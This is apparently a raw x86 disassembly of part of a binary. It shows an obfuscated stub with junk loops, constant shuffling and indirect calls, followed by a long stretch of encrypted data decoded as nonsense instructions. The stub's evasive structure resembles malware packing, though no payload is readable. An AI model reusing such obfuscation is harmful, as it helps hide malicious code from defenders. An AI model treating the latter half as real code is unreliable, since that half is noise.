  40a3ae:	jmp    0x40a3c0
  40a3b3:	mov    edi,DWORD PTR ds:0x42c008
  40a3b9:	inc    edi
  40a3ba:	mov    DWORD PTR ds:0x42c008,edi
  40a3c0:	cmp    DWORD PTR ds:0x42c008,0x1f
  40a3c7:	jae    0x40a451
  40a3cd:	cmp    DWORD PTR ds:0x42c008,0x25
  40a3d4:	jne    0x40a3e8
  40a3da:	push   0x3550
  40a3df:	push   DWORD PTR [ebp-0x1c]
  40a3e2:	call   DWORD PTR ds:0x42ed35
  40a3e8:	jmp    0x40a3b3
  40a3ed:	and    DWORD PTR ds:0x42d018,0x0
  40a3f7:	jmp    0x40a407
  40a3fc:	mov    eax,ds:0x42d018
  40a401:	inc    eax
  40a402:	mov    ds:0x42d018,eax
  40a407:	cmp    DWORD PTR ds:0x42d018,0x1a
  40a40e:	jae    0x40a451
  40a414:	cmp    DWORD PTR ds:0x42d018,0x8
  40a41b:	jne    0x40a434
  40a421:	push   DWORD PTR [ebp-0x1c]
  40a424:	push   0x42d014
  40a429:	push   0x5fa0
  40a42e:	call   DWORD PTR ds:0x42ed39
  40a434:	cmp    DWORD PTR ds:0x42d018,0x7
  40a43b:	jne    0x40a44c
  40a441:	mov    eax,ds:0x42d018
  40a446:	inc    eax
  40a447:	mov    ds:0x42d018,eax
  40a44c:	jmp    0x40a3fc
  40a451:	mov    edi,DWORD PTR [ebp+0x8]
  40a454:	mov    eax,ds:0x42e435
  40a459:	and    DWORD PTR ds:0x42a00c,0x728
  40a463:	mov    eax,DWORD PTR [eax+0x198]
  40a469:	xor    edi,ecx
  40a46b:	mov    edx,0x3272dd
  40a470:	and    DWORD PTR ds:0x42b010,0x42d000
  40a47a:	add    edi,edx
  40a47c:	mov    DWORD PTR ds:0x429000,0x5af1
  40a486:	cmp    DWORD PTR [eax],edi
  40a488:	je     0x40a49f
  40a48e:	mov    DWORD PTR ds:0x429000,0x225c
  40a498:	mov    eax,DWORD PTR [eax]
  40a49a:	jmp    0x40cc18
  40a49f:	mov    eax,0x3847
  40a4a4:	mov    eax,DWORD PTR [ebp+0x18]
  40a4a7:	cmp    eax,esi
  40a4a9:	mov    DWORD PTR ds:0x429014,0x6496
  40a4b3:	jne    0x40a4d7
  40a4b9:	mov    DWORD PTR ds:0x42b000,0x18c7
  40a4c3:	push   0xf89c85b2
  40a4c8:	mov    DWORD PTR ds:0x42c014,0x18
  40a4d2:	jmp    0x40cc07
  40a4d7:	mov    esi,DWORD PTR [ebp+0x18]
  40a4da:	mov    DWORD PTR ds:0x42b000,ebx
  40a4e0:	mov    eax,0xf89c85b3
  40a4e5:	cmp    esi,eax
  40a4e7:	mov    DWORD PTR ds:0x42b008,0x2007
  40a4f1:	jne    0x40cbf7
  40a4f7:	mov    eax,ds:0x42c008
  40a4fc:	xor    DWORD PTR ds:0x429004,eax
  40a502:	mov    eax,DWORD PTR [ebp+0x10]
  40a505:	dec    esi
  40a506:	xor    eax,ecx
  40a508:	adc    esi,DWORD PTR ds:0x42d008
  40a50e:	add    eax,edx
  40a510:	xor    esi,esi
  40a512:	or     esi,DWORD PTR ds:0x42c008
  40a518:	adc    DWORD PTR ds:0x42d010,esi
  40a51e:	mov    DWORD PTR [ebp-0x18],eax
  40a521:	mov    eax,DWORD PTR [ebp+0xc]
  40a524:	adc    DWORD PTR ds:0x42d010,0x3da6
  40a52e:	mov    esi,DWORD PTR [ebp-0x8]
  40a531:	xor    eax,ecx
  40a533:	add    DWORD PTR ds:0x42d018,0x6859
  40a53d:	add    eax,edx
  40a53f:	imul   eax,DWORD PTR [esi]
  40a542:	mov    esi,DWORD PTR [ebp+0x8]
  40a545:	or     DWORD PTR ds:0x42d014,0x363e
  40a54f:	xor    esi,ecx
  40a551:	mov    DWORD PTR ds:0x42b010,0xc36
  40a55b:	add    esi,edx
  40a55d:	mov    DWORD PTR ds:0x42d010,0x490b
  40a567:	cmp    esi,eax
  40a569:	mov    eax,ds:0x42d018
  40a56e:	mov    eax,DWORD PTR [ebp-0x4]
  40a571:	push   ebx
  40a572:	mov    DWORD PTR ds:0x42a008,0x30a3
  40a57c:	je     0x40a688
  40a582:	mov    DWORD PTR ds:0x42d008,0x4e69
  40a58c:	mov    esi,DWORD PTR [ebp-0x18]
  40a58f:	or     DWORD PTR ds:0x42a01c,0x42c010
  40a599:	add    DWORD PTR [eax],esi
  40a59b:	mov    DWORD PTR ds:0x42b00c,0x14
  40a5a5:	cmp    DWORD PTR ds:0x42b00c,0x0
  40a5ac:	je     0x40a5f7
  40a5b2:	cmp    DWORD PTR ds:0x42b00c,0x3
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x42e0a1
  40a5c4:	push   0x42e035
  40a5c9:	call   DWORD PTR ds:0x42ed3d
  40a5cf:	cmp    DWORD PTR ds:0x42b00c,0x4
  40a5d6:	jne    0x40a5e7
  40a5dc:	mov    eax,ds:0x42b00c
  40a5e1:	dec    eax
  40a5e2:	mov    ds:0x42b00c,eax
  40a5e7:	mov    eax,ds:0x42b00c
  40a5ec:	dec    eax
  40a5ed:	mov    ds:0x42b00c,eax
  40a5f2:	jmp    0x40a5a5
  40a5f7:	mov    eax,DWORD PTR [ebp-0x4]
  40a5fa:	mov    DWORD PTR ds:0x42d004,0x12
  40a604:	cmp    DWORD PTR ds:0x42d004,0x0
  40a60b:	je     0x40a64f
  40a611:	cmp    DWORD PTR ds:0x42d004,0x21
  40a618:	jne    0x40a633
  40a61e:	push   0x5688
  40a623:	push   0x5318
  40a628:	push   0x314e
  40a62d:	call   DWORD PTR ds:0x42ed41
  40a633:	mov    esi,DWORD PTR ds:0x42d004
  40a639:	dec    esi
  40a63a:	mov    DWORD PTR ds:0x42d004,esi
  40a640:	jmp    0x40a604
  40a645:	sub    DWORD PTR ds:0x42c010,0x7728
  40a64f:	mov    esi,DWORD PTR [ebp+0xc]
  40a652:	add    DWORD PTR ds:0x42c018,0x42b00c
  40a65c:	xor    esi,ecx
  40a65e:	xor    DWORD PTR ds:0x429020,0x39e1
  40a668:	add    esi,edx
  40a66a:	xor    DWORD PTR ds:0x42b00c,0x429028
  40a674:	imul   esi,DWORD PTR [eax]
  40a677:	mov    DWORD PTR [eax],esi
  40a679:	mov    DWORD PTR ds:0x42d000,0x1b30
  40a683:	jmp    0x40a68f
  40a688:	and    edi,edi
  40a68a:	mov    esi,DWORD PTR [ebp+0x14]
  40a68d:	xor    DWORD PTR [eax],esi
  40a68f:	sbb    eax,edi
  40a691:	mov    eax,DWORD PTR [ebp-0x4]
  40a694:	mov    DWORD PTR ds:0x429020,0x1e
  40a69e:	cmp    DWORD PTR ds:0x429020,0x0
  40a6a5:	je     0x40a6f7
  40a6ab:	cmp    DWORD PTR ds:0x429020,0xf
  40a6b2:	jne    0x40a6cb
  40a6b8:	push   DWORD PTR [ebp-0x24]
  40a6bb:	push   0x42b000
  40a6c0:	push   0x2936
  40a6c5:	call   DWORD PTR ds:0x42ed45
  40a6cb:	cmp    DWORD PTR ds:0x429020,0x10
  40a6d2:	jne    0x40a6e5
  40a6d8:	mov    esi,DWORD PTR ds:0x429020
  40a6de:	dec    esi
  40a6df:	mov    DWORD PTR ds:0x429020,esi
  40a6e5:	mov    esi,DWORD PTR ds:0x429020
  40a6eb:	dec    esi
  40a6ec:	mov    DWORD PTR ds:0x429020,esi
  40a6f2:	jmp    0x40a69e
  40a6f7:	mov    edi,DWORD PTR [ebp+0x10]
  40a6fa:	xor    edi,ecx
  40a6fc:	mov    esi,0xffcd8d23
  40a701:	mov    ebx,esi
  40a703:	sub    ebx,edi
  40a705:	jmp    0x40caae
  40a70a:	inc    ecx
  40a70b:	sbb    al,0x8b
  40a70e:	fwait
  40a70f:	jnp    0x40a702
  40a711:	mov    BYTE PTR [ebx-0x40a83f7d],bl
  40a717:	jnp    0x40a705
  40a719:	test   BYTE PTR [ebp+0x4],ch
  40a71c:	jp     0x40a798
  40a71e:	out    0x5f,al
  40a720:	jp     0x40a79c
  40a722:	lods   eax,DWORD PTR ds:[esi]
  40a723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a724:	mov    al,ds:0x6a579879
  40a729:	into   
  40a72a:	and    al,0x62
  40a72c:	lods   al,BYTE PTR ds:[esi]
  40a72d:	stos   BYTE PTR es:[edi],al
  40a72e:	jle    0x40a6da
  40a730:	das    
  40a731:	pop    edx
  40a732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a733:	das    
  40a734:	mov    ds:0x5b466bd1,al
  40a739:	call   0xee7204f7
  40a73e:	jp     0x40a795
  40a740:	in     eax,dx
  40a741:	pop    ebx
  40a742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a743:	adc    BYTE PTR [esi-0x4],bh
  40a746:	aam    0x98
  40a748:	(bad)  
  40a749:	and    al,0x5a
  40a74b:	xchg   edx,eax
  40a74c:	inc    edx
  40a74d:	mov    dl,0x41
  40a74f:	mov    DWORD PTR [ebx+0xd],eax
  40a752:	imul   ebx,DWORD PTR [edx+ecx*4-0x64],0xe47fd3ed
  40a75a:	gs ins DWORD PTR es:[edi],dx
  40a75c:	pop    ebp
  40a75d:	pop    eax
  40a75e:	retf   
  40a75f:	aaa    
  40a760:	add    ah,al
  40a762:	retf   0xb12
  40a765:	mov    eax,ds:0xa9704870
  40a76a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a76b:	popf   
  40a76c:	lahf   
  40a76d:	and    DWORD PTR [esi],esp
  40a76f:	repz popw ds
  40a772:	scas   eax,DWORD PTR es:[edi]
  40a773:	mov    WORD PTR [edx+0x43],ds
  40a776:	or     DWORD PTR [ecx+0x6d19c6c8],ecx
  40a77c:	aad    0x87
  40a77e:	pop    esp
  40a77f:	mov    ebx,0xa606435b
  40a784:	imul   edx,DWORD PTR [esi],0xce5a5963
  40a78a:	out    dx,eax
  40a78b:	sbb    BYTE PTR [edi-0x21fff065],dh
  40a791:	mov    al,ds:0xea2739ce
  40a796:	addr16 adc edx,ebp
  40a799:	std    
  40a79a:	inc    esi
  40a79b:	pop    edx
  40a79c:	inc    ecx
  40a79d:	pop    ebp
  40a79e:	or     edx,esp
  40a7a0:	dec    eax
  40a7a1:	leave  
  40a7a2:	push   esi
  40a7a3:	into   
  40a7a4:	shr    DWORD PTR ds:[edx-0x4d],cl
  40a7a8:	xchg   ebx,eax
  40a7a9:	(bad)  
  40a7aa:	sbb    DWORD PTR [eax+0x4d],ebp
  40a7ad:	stos   DWORD PTR es:[edi],eax
  40a7ae:	mov    edi,0xef344dc3
  40a7b3:	mov    ebx,0xae1891b9
  40a7b8:	cmp    edx,0xffffffc1
  40a7bb:	and    DWORD PTR [ecx-0x484edfb6],ebp
  40a7c1:	jmp    0xe7d8e45b
  40a7c6:	pop    esp
  40a7c7:	push   0x5a58ad35
  40a7cc:	xor    edi,DWORD PTR [eax]
  40a7ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7cf:	pusha  
  40a7d0:	fwait
  40a7d1:	(bad)  
  40a7d4:	aas    
  40a7d5:	mov    esi,edx
  40a7d7:	cmp    BYTE PTR [ebx-0x31],bh
  40a7da:	int3   
  40a7db:	jp     0x40a829
  40a7dd:	adc    al,0x4a
  40a7df:	retf   
  40a7e0:	loopne 0x40a779
  40a7e2:	sti    
  40a7e3:	add    al,0x5e
  40a7e5:	pusha  
  40a7e6:	retf   
  40a7e7:	(bad)  
  40a7e8:	pop    ds
  40a7e9:	dec    ecx
  40a7ea:	jp     0x40a7f5
  40a7ec:	xor    BYTE PTR [eax],0xd7
  40a7ef:	sbb    ecx,DWORD PTR [esi-0x5c]
  40a7f2:	mov    ecx,0x65fb8085
  40a7f7:	fnsetpm(287 only) 
  40a7f9:	ins    BYTE PTR es:[edi],dx
  40a7fa:	in     al,dx
  40a7fb:	std    
  40a7fc:	dec    edx
  40a7fd:	sbb    ebp,DWORD PTR [edx+0x4f]
  40a800:	sbb    dh,BYTE PTR [eax-0x6e785765]
  40a806:	and    eax,0xcc64f783
  40a80b:	cmp    al,BYTE PTR [ecx+edx*8]
  40a80e:	gs out 0x7d,al
  40a811:	add    bl,ch
  40a813:	test   BYTE PTR [edi+0x5c],dh
  40a816:	out    0x5a,eax
  40a818:	call   0x9c1f:0xf0c20b94
  40a81f:	fsubr  QWORD PTR [eax]
  40a821:	or     esi,DWORD PTR [esi]
  40a823:	gs inc esp
  40a825:	loop   0x40a84c
  40a827:	push   ss
  40a828:	shl    BYTE PTR [ebx+0x4],1
  40a82b:	imul   eax,eax,0x132b8aea
  40a831:	frstor [edi+0x11ad3cf6]
  40a837:	out    0x96,eax
  40a839:	inc    ebp
  40a83a:	xor    edi,DWORD PTR [ebx-0x66d8cd30]
  40a840:	mov    WORD PTR [ecx+0x7d],fs
  40a843:	popa   
  40a844:	sbb    eax,0x45c3472
  40a849:	or     al,0x79
  40a84b:	lea    esp,[edx-0x5]
  40a84e:	add    DWORD PTR [eax-0x7e],eax
  40a851:	xor    dh,0x96
  40a854:	jmp    0x40a882
  40a856:	lock jno 0x40a819
  40a859:	adc    eax,0x2cba02e4
  40a85e:	mov    ecx,0xfb1ffeeb
  40a863:	pop    ebp
  40a864:	daa    
  40a865:	inc    esi
  40a866:	dec    ecx
  40a867:	jl     0x40a8cd
  40a869:	add    DWORD PTR [ebx-0x75],ecx
  40a86c:	pop    edx
  40a86d:	rcr    BYTE PTR ds:0xc15e6d71,0x8
  40a874:	fisub  DWORD PTR [ebp-0x10f4c38]
  40a87a:	sub    al,0x2b
  40a87c:	or     DWORD PTR [edi+0x66cd4a0b],eax
  40a882:	xchg   DWORD PTR [edi-0x50224ed0],esi
  40a888:	cmp    edi,ebp
  40a88a:	adc    eax,edi
  40a88c:	jo     0x40a835
  40a88e:	mov    ebx,0xe0a90740
  40a893:	inc    ecx
  40a894:	out    0x9e,eax
  40a896:	mov    WORD PTR [ebp+0x19],fs
  40a899:	scas   al,BYTE PTR es:[edi]
  40a89a:	sub    BYTE PTR [esi+eax*2+0x36667e60],0xa0
  40a8a2:	shr    BYTE PTR [edx-0x31],1
  40a8a5:	mov    ebp,0x1bd8b032
  40a8aa:	adc    bh,dh
  40a8ac:	lods   eax,DWORD PTR ds:[esi]
  40a8ad:	mov    bh,0x97
  40a8af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8b0:	add    al,BYTE PTR fs:[ebp-0x40]
  40a8b4:	xor    DWORD PTR [esi+0x282e1408],0x38e2e566
  40a8be:	adc    ecx,ebp
  40a8c0:	dec    edx
  40a8c1:	adc    edi,edi
  40a8c3:	ror    DWORD PTR [ebp-0x36859a2a],0x90
  40a8ca:	or     bl,bl
  40a8cc:	lock and BYTE PTR [ebp-0x61374631],bl
  40a8d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8d4:	mov    eax,ds:0x1c1a3cec
  40a8d9:	inc    ecx
  40a8da:	inc    ebx
  40a8db:	daa    
  40a8dc:	mov    eax,0xc80270e4
  40a8e1:	fidivr DWORD PTR [ebx+ebp*8+0xb]
  40a8e5:	inc    edx
  40a8e6:	add    ebp,DWORD PTR [edi-0x5d]
  40a8e9:	(bad)  
  40a8ea:	pop    edx
  40a8eb:	dec    ecx
  40a8ec:	pop    eax
  40a8ed:	pop    esp
  40a8ee:	pushf  
  40a8ef:	stc    
  40a8f0:	xor    eax,DWORD PTR [edi-0x13]
  40a8f3:	vunpcklps ymm4,ymm6,YMMWORD PTR [edx+0x645cf8c8]
  40a8fb:	(bad)  
  40a8fc:	mov    bh,0xfb
  40a8fe:	mov    eax,0xbb7cc295
  40a903:	hlt    
  40a904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a905:	adc    esi,edx
  40a907:	stos   BYTE PTR es:[edi],al
  40a908:	popf   
  40a909:	mov    eax,0xe0736c95
  40a90e:	inc    ebp
  40a90f:	mov    dh,0xa2
  40a911:	mov    bl,0x1e
  40a913:	xchg   edi,eax
  40a914:	fwait
  40a915:	sbb    eax,0xe9bb1fe0
  40a91a:	ss dec edi
  40a91c:	mov    esp,0x4b0e87b3
  40a921:	dec    ebp
  40a922:	xor    al,0xaa
  40a924:	ss out dx,eax
  40a926:	push   ecx
  40a927:	cmp    BYTE PTR [ecx-0x78788661],ah
  40a92d:	fiadd  DWORD PTR [edx-0x7d]
  40a930:	(bad)  
  40a931:	(bad)  
  40a932:	ss jae 0x40a955
  40a935:	push   eax
  40a936:	push   esp
  40a937:	mov    edi,0xfbcc4fa6
  40a93c:	push   eax
  40a93d:	inc    edi
  40a93e:	sbb    ebp,ebp
  40a940:	test   al,0x92
  40a942:	dec    ecx
  40a943:	lea    ebx,[esi+0x4e205a15]
  40a949:	nop
  40a94a:	push   ebx
  40a94b:	outs   dx,DWORD PTR ds:[esi]
  40a94c:	push   edi
  40a94d:	mov    ds:0x4746fc1a,eax
  40a952:	push   ecx
  40a953:	jp     0x40a988
  40a955:	outs   dx,BYTE PTR ds:[esi]
  40a956:	(bad)  
  40a957:	pop    ebx
  40a958:	cmp    dl,cl
  40a95a:	imul   esp,DWORD PTR ds:0x8cb05d34,0xffffffd9
  40a961:	cdq    
  40a962:	call   0x95a0:0x9fe6f6ad
  40a969:	out    dx,eax
  40a96a:	cld    
  40a96b:	inc    edx
  40a96c:	mov    edi,0xc258792c
  40a971:	push   es
  40a972:	dec    esi
  40a973:	inc    edi
  40a974:	in     al,0x31
  40a976:	mov    edi,0x12667a56
  40a97b:	fs mov eax,0x98fc7dc6
  40a981:	inc    esi
  40a982:	adc    BYTE PTR [eax],cl
  40a984:	xor    BYTE PTR [eax-0x4],bl
  40a987:	in     eax,0xa3
  40a989:	or     ch,BYTE PTR [ebp-0x52bfdf73]
  40a98f:	(bad)
  40a993:	jb     0x40a9b6
  40a995:	sub    eax,eax
  40a997:	(bad)  
  40a998:	repnz test eax,0x7a3e25b
  40a99e:	add    BYTE PTR [ebp+ebx*4-0x5d861901],al
  40a9a5:	mov    al,0x89
  40a9a7:	fisubr WORD PTR [edi+0x5a]
  40a9aa:	xor    al,ah
  40a9ac:	sbb    al,0xa1
  40a9ae:	jbe    0x40a9af
  40a9b0:	sbb    eax,0x54be2ade
  40a9b5:	sub    eax,0x2349758
  40a9ba:	dec    DWORD PTR [edx+0x23]
  40a9bd:	cdq    
  40a9be:	pop    ebx
  40a9bf:	xchg   esp,eax
  40a9c0:	jl     0x40a978
  40a9c2:	mov    edi,DWORD PTR [ebx]
  40a9c4:	push   ecx
  40a9c5:	ret    0x787b
  40a9c8:	aam    0xef
  40a9ca:	test   eax,0xc19d1b0f
  40a9cf:	sub    eax,0x6cb6e368
  40a9d4:	jmp    FWORD PTR ds:0xe3f98a36
  40a9da:	ds mov ecx,0x8421e4a5
  40a9e0:	push   edx
  40a9e1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9e3:	lds    ecx,FWORD PTR [edi-0x65]
  40a9e6:	and    esp,edi
  40a9e8:	xor    al,0xce
  40a9ea:	and    ebx,esp
  40a9ec:	xor    DWORD PTR [ebp+0x6b0b18ca],ecx
  40a9f2:	fcomp  DWORD PTR [ebp+0x5e]
  40a9f5:	stc    
  40a9f6:	add    al,0xda
  40a9f8:	sbb    eax,0x11b23036
  40a9fd:	inc    ebx
  40a9fe:	xor    ah,BYTE PTR [eax+edi*2+0x50]
  40aa02:	sar    DWORD PTR [ebp+0x53],0x1
  40aa06:	jno    0x40aa62
  40aa08:	int3   
  40aa09:	fdiv   st(2),st
  40aa0b:	clc    
  40aa0c:	push   cs
  40aa0d:	std    
  40aa0e:	pop    edx
  40aa0f:	dec    edi
  40aa10:	xor    eax,0xb62fbc06
  40aa15:	mov    edi,DWORD PTR [edx]
  40aa17:	mov    dl,BYTE PTR [eax]
  40aa19:	lahf   
  40aa1a:	add    al,0xbd
  40aa1c:	bound  ecx,QWORD PTR [edi]
  40aa1e:	mov    eax,ds:0x1a29095b
  40aa23:	dec    eax
  40aa24:	jnp    0x40aa9f
  40aa26:	and    esi,DWORD PTR [edi+0x2251e85b]
  40aa2c:	sub    eax,0x63ac4110
  40aa31:	push   esp
  40aa32:	sub    eax,0x6b2d834e
  40aa37:	(bad)  [ebx+edx*4]
  40aa3a:	mov    fs,esi
  40aa3c:	std    
  40aa3d:	or     al,BYTE PTR [edi+0x18]
  40aa40:	or     al,0x78
  40aa42:	les    ecx,FWORD PTR [edi]
  40aa44:	xlat   BYTE PTR ds:[ebx]
  40aa45:	imul   edx,ecx,0x52
  40aa48:	dec    esp
  40aa49:	pop    edi
  40aa4a:	aaa    
  40aa4b:	cmp    DWORD PTR ds:0xd86a5faa,ebx
  40aa51:	xlat   BYTE PTR ds:[ebx]
  40aa52:	add    ebx,eax
  40aa54:	mov    ds:0xf5b6f5a8,eax
  40aa59:	popa   
  40aa5a:	sub    eax,0xffca3339
  40aa5f:	jne    0x40aa59
  40aa61:	retf   
  40aa62:	xor    ebx,DWORD PTR [esi+edx*8]
  40aa65:	xchg   esi,eax
  40aa66:	sub    al,0x7
  40aa68:	push   0x19d97963
  40aa6d:	jp     0x40aaa2
  40aa6f:	sub    al,0xa
  40aa71:	pop    esp
  40aa72:	fcmovbe st,st(6)
  40aa74:	ins    BYTE PTR es:[edi],dx
  40aa75:	call   0xb9a7:0xc6c30736
  40aa7c:	push   0x38
  40aa7e:	mov    esp,0x66ab8233
  40aa83:	mul    DWORD PTR [edx-0x14b0e8ee]
  40aa89:	mov    bh,BYTE PTR [esi+0x8]
  40aa8c:	and    eax,0xbd4614a3
  40aa91:	inc    edx
  40aa92:	mov    bh,0x2f
  40aa94:	adc    BYTE PTR [eax+0x33],cl
  40aa97:	mov    eax,ds:0xd30fe476
  40aa9c:	pop    ebp
  40aa9d:	inc    ecx
  40aa9e:	add    BYTE PTR [edi+0x79],cl
  40aaa1:	sub    eax,0x175cffeb
  40aaa6:	add    bl,0x2
  40aaa9:	stc    
  40aaaa:	push   es
  40aaab:	outs   dx,BYTE PTR ds:[esi]
  40aaac:	add    al,0x6
  40aaae:	add    bl,BYTE PTR [ebp+0x3311a6ac]
  40aab4:	les    ebx,FWORD PTR [edi-0x58d5ac65]
  40aaba:	(bad)  
  40aabb:	int3   
  40aabc:	sti    
  40aabd:	sub    al,0xaf
  40aabf:	inc    ecx
  40aac0:	mov    dh,0x13
  40aac2:	cmp    ah,BYTE PTR [edx+0x4d]
  40aac5:	add    al,0xe
  40aac7:	fistp  QWORD PTR [eax+edi*1-0x7a]
  40aacb:	ror    edi,cl
  40aacd:	sub    ah,BYTE PTR [eax]
  40aacf:	std    
  40aad0:	push   eax
  40aad1:	gs retf 
  40aad3:	mov    ds:0x7ba8b4e0,al
  40aad8:	dec    esi
  40aad9:	call   0xb229:0x5923a872
  40aae0:	call   0x28af:0x524fae10
  40aae7:	jl     0x40aabe
  40aae9:	(bad)  
  40aaea:	mov    dl,0xe7
  40aaec:	in     al,dx
  40aaed:	lods   al,BYTE PTR ds:[esi]
  40aaee:	pop    edx
  40aaef:	stos   DWORD PTR es:[edi],eax
  40aaf0:	sub    DWORD PTR [edi-0x16],0x1048979e
  40aaf7:	mov    esp,ebp
  40aaf9:	xor    edx,edx
  40aafb:	(bad)  
  40aafc:	sbb    al,0x75
  40aafe:	mov    ebp,0x67b56121
  40ab03:	repz es mov dh,0xed
  40ab07:	(bad)  
  40ab08:	fstp   DWORD PTR [edx-0xf3b4b1e]
  40ab0e:	ds pushf 
  40ab10:	mov    ah,0xd7
  40ab12:	sub    eax,0xc01c5e67
  40ab17:	and    ebp,DWORD PTR [edx-0x28568592]
  40ab1d:	es mov dl,0x49
  40ab20:	call   0x6722bd7c
  40ab25:	fsubr  QWORD PTR [edi+0x45]
  40ab28:	mov    esp,0x3a6edb3
  40ab2d:	pop    esp
  40ab2e:	mov    esi,0xdf0fb2e2
  40ab33:	cmc    
  40ab34:	mov    ch,0x3d
  40ab36:	jbe    0x40ab4a
  40ab38:	inc    esi
  40ab39:	adc    eax,DWORD PTR [edi-0x37787ebe]
  40ab3f:	(bad)  
  40ab41:	sub    eax,esp
  40ab43:	mul    dh
  40ab45:	inc    edi
  40ab46:	add    eax,0x1a36bb4a
  40ab4b:	int3   
  40ab4c:	mov    esp,DWORD PTR [edi+0x43171a6]
  40ab52:	retf   0x5c0a
  40ab55:	ins    DWORD PTR es:[edi],dx
  40ab56:	mov    ds:0x9725624f,eax
  40ab5b:	mov    bh,0xb5
  40ab5d:	mov    DWORD PTR [ebp+0x14],eax
  40ab60:	pop    esi
  40ab61:	pusha  
  40ab62:	xchg   DWORD PTR [eax+eax*4+0x2a62a161],ecx
  40ab69:	sub    BYTE PTR [edi+edx*2-0x569c4b90],bh
  40ab70:	outs   dx,DWORD PTR ds:[esi]
  40ab71:	ins    BYTE PTR es:[edi],dx
  40ab72:	lea    ebx,[edx+0x14]
  40ab75:	xchg   BYTE PTR [edi],bh
  40ab77:	push   ss
  40ab78:	lds    ebp,FWORD PTR [eax]
  40ab7a:	daa    
  40ab7b:	retf   0xc55b
  40ab7e:	es (bad) 
  40ab80:	shr    BYTE PTR ds:0xcdc1c52f,cl
  40ab86:	daa    
  40ab87:	push   ebp
  40ab88:	int    0xe2
  40ab8a:	jnp    0x40abb1
  40ab8c:	jbe    0x40ab16
  40ab8e:	and    DWORD PTR [ecx],ecx
  40ab90:	pushf  
  40ab91:	sbb    DWORD PTR [eax-0x32677f72],esi
  40ab97:	xchg   ebx,eax
  40ab98:	sub    eax,0xc846f7ab
  40ab9d:	add    eax,esp
  40ab9f:	call   0x7da1:0xa055dacd
  40aba6:	mov    ecx,0xe4bb2ae0
  40abab:	lahf   
  40abac:	jbe    0x40ac0e
  40abae:	lahf   
  40abaf:	stos   BYTE PTR es:[edi],al
  40abb0:	lahf   
  40abb1:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abb3:	add    al,0xc2
  40abb5:	lock scas eax,DWORD PTR es:[edi]
  40abb7:	lahf   
  40abb8:	mov    bl,0x40
  40abba:	push   es
  40abbb:	imul   esi,DWORD PTR [eax+0x2eeb078c],0xfffffffc
  40abc2:	popf   
  40abc3:	jo     0x40ac2d
  40abc5:	data16 ja 0x40ac2d
  40abc8:	jle    0x40abf8
  40abca:	das    
  40abcb:	out    dx,eax
  40abcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abcd:	rcr    BYTE PTR [eax-0x6f83f313],cl
  40abd3:	dec    ecx
  40abd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abd5:	pop    esi
  40abd6:	movaps xmm6,XMMWORD PTR [esi]
  40abd9:	js     0x40ac25
  40abdb:	mov    BYTE PTR [esi+0x1f],bl
  40abde:	mov    ds:0xb719c1cd,eax
  40abe3:	inc    ecx
  40abe4:	neg    DWORD PTR [eax*1-0x77ba0696]
  40abeb:	lock or al,0xa
  40abee:	fmul   DWORD PTR [eax+0x628c2c0]
  40abf4:	scas   eax,DWORD PTR es:[edi]
  40abf5:	cmp    DWORD PTR [ecx],edi
  40abf7:	outs   dx,BYTE PTR ds:[esi]
  40abf8:	push   0x3a
  40abfa:	stos   DWORD PTR es:[edi],eax
  40abfb:	es push edx
  40abfd:	sbb    DWORD PTR [esi+eiz*2-0x1b],ecx
  40ac01:	push   0xf8e9c429
  40ac06:	js     0x40abf9
  40ac08:	and    BYTE PTR [edi+0x6ae6d12d],bh
  40ac0e:	xchg   ecx,eax
  40ac0f:	dec    eax
  40ac10:	stos   BYTE PTR es:[edi],al
  40ac11:	push   cs
  40ac12:	jne    0x40abb2
  40ac14:	in     al,0x5d
  40ac16:	push   DWORD PTR [edi-0x59]
  40ac19:	out    0x63,al
  40ac1b:	ins    DWORD PTR es:[edi],dx
  40ac1c:	xor    al,0x80
  40ac1e:	dec    esi
  40ac1f:	bound  eax,QWORD PTR [edx-0x4d17966b]
  40ac25:	out    0xa5,al
  40ac27:	and    BYTE PTR [edx],bh
  40ac29:	push   edi
  40ac2a:	sbb    ch,ch
  40ac2c:	int3   
  40ac2d:	shl    BYTE PTR [esi-0x989104e],0x5c
  40ac34:	push   esp
  40ac35:	jo     0x40ac7b
  40ac37:	push   ds
  40ac38:	sbb    ebp,DWORD PTR [ebx]
  40ac3a:	dec    eax
  40ac3b:	mov    esi,0xf6213673
  40ac40:	cmp    BYTE PTR [eax],ah
  40ac42:	sub    BYTE PTR [ebx],ch
  40ac44:	out    dx,al
  40ac45:	sbb    eax,0xbf003563
  40ac4a:	jg     0x40ac89
  40ac4c:	xor    dl,BYTE PTR ds:[edi+eiz*1]
  40ac50:	stc    
  40ac51:	mov    esi,?
  40ac53:	adc    BYTE PTR [ecx+0x5e3a7fd0],0x7f
  40ac5a:	imul   edi,ecx,0xe9bee66f
  40ac60:	popf   
  40ac61:	or     al,0x70
  40ac63:	cwde   
  40ac64:	push   ss
  40ac65:	daa    
  40ac66:	dec    esi
  40ac67:	adc    cl,BYTE PTR [ecx+0x48e19b5a]
  40ac6d:	scas   al,BYTE PTR es:[edi]
  40ac6e:	xchg   ecx,eax
  40ac6f:	push   cs
  40ac70:	ror    DWORD PTR [edi+0x3b],1
  40ac73:	push   ecx
  40ac74:	xchg   edi,eax
  40ac75:	mov    ah,0xec
  40ac77:	shl    ecx,1
  40ac79:	mov    ebp,0xe4f058e9
  40ac7e:	cmp    ah,dh
  40ac80:	xor    al,0x21
  40ac82:	pop    ss
  40ac83:	mov    ebx,DWORD PTR fs:[ebx-0x763acb5d]
  40ac8a:	inc    ecx
  40ac8b:	aaa    
  40ac8c:	adc    esp,ebx
  40ac8e:	adc    edx,DWORD PTR [edi+ecx*4]
  40ac91:	mov    ebp,0xb62e7465
  40ac96:	in     eax,0x9c
